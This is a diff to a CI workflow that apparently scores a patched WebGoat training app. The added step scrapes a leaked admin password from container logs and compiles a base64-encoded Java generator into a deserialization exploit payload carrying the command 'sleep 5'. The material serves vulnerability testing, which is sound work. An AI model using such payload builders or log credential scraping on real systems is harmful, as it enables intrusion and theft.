@@ -100,6 +100,16 @@ jobs:
         run: |
           echo "::group::app logs"; docker logs app 2>&1 | tail -100 || true; echo "::endgroup::"
 
+      - name: Gather docker-dependent recon on the host (scorer sandbox has no docker)
+        run: |
+          # WebGoat 72/74 need docker to read the app log / build the deser gadget; the sandboxed
+          # scorer has none, so gather them here on the runner and pass to the scorer via -e.
+          LEAK=$(docker logs app 2>&1 | grep -oE 'Password for admin: *[A-Za-z0-9+/=]{20,}' | tail -1 | sed 's/.*: *//')
+          echo "WEBGOAT_LEAKED_ADMIN_PW=$(printf '%s' "$LEAK" | base64 -d 2>/dev/null || true)" >> "$GITHUB_ENV"
+          GENB64='aW1wb3J0IGphdmEuaW8uKjsgaW1wb3J0IGphdmEudXRpbC5CYXNlNjQ7IGltcG9ydCBvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyOwpwdWJsaWMgY2xhc3MgR2VuIHsgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYSkgdGhyb3dzIEV4Y2VwdGlvbiB7CiAgVnVsbmVyYWJsZVRhc2tIb2xkZXIgdCA9IG5ldyBWdWxuZXJhYmxlVGFza0hvbGRlcigiZGVsZXRlIiwgInNsZWVwIDUiKTsKICBCeXRlQXJyYXlPdXRwdXRTdHJlYW0gYiA9IG5ldyBCeXRlQXJyYXlPdXRwdXRTdHJlYW0oKTsKICBPYmplY3RPdXRwdXRTdHJlYW0gbyA9IG5ldyBPYmplY3RPdXRwdXRTdHJlYW0oYik7IG8ud3JpdGVPYmplY3QodCk7IG8uZmx1c2goKTsKICBTeXN0ZW0ub3V0LnByaW50bG4oQmFzZTY0LmdldEVuY29kZXIoKS5lbmNvZGVUb1N0cmluZyhiLnRvQnl0ZUFycmF5KCkpKTsgfSB9'
+          PAYLOAD=$(docker exec -e GENB64="$GENB64" app sh -c 'cd /tmp && rm -rf wgd && mkdir wgd && cd wgd && jar xf /home/webgoat/webgoat.jar BOOT-INF/classes/org/dummy/insecure/framework/VulnerableTaskHolder.class 2>/dev/null; SLF4J=$(jar tf /home/webgoat/webgoat.jar | grep -i slf4j-api | head -1); jar xf /home/webgoat/webgoat.jar "$SLF4J" 2>/dev/null; CP="BOOT-INF/classes:$SLF4J"; echo "$GENB64" | base64 -d > Gen.java; javac -cp "$CP" Gen.java 2>/dev/null; java -cp "$CP:." Gen 2>/dev/null' | tail -1)
+          echo "WEBGOAT_DESER_PAYLOAD=$PAYLOAD" >> "$GITHUB_ENV"
+
       - name: Score the patched WebGoat (embedded rubric)
         run: |
           mkdir -p "$PWD/score-out"
@@ -107,6 +117,7 @@ jobs:
           docker run --rm --network ctfnet \
             -e GITHUB_WORKSPACE=/out -v "$PWD/score-out:/out" -w /out \
             -e WEBWOLF_URL=http://app:9090/WebWolf \
+            -e WEBGOAT_LEAKED_ADMIN_PW -e WEBGOAT_DESER_PAYLOAD \
             "$SCORER_IMAGE" --target webgoat --url http://app:8080/WebGoat || rc=$?
           if [ "$rc" -ge 100 ]; then echo "::error::scorer failed (exit $rc)"; exit "$rc"; fi
           echo "Scorer finished: $rc challenge(s) still open."
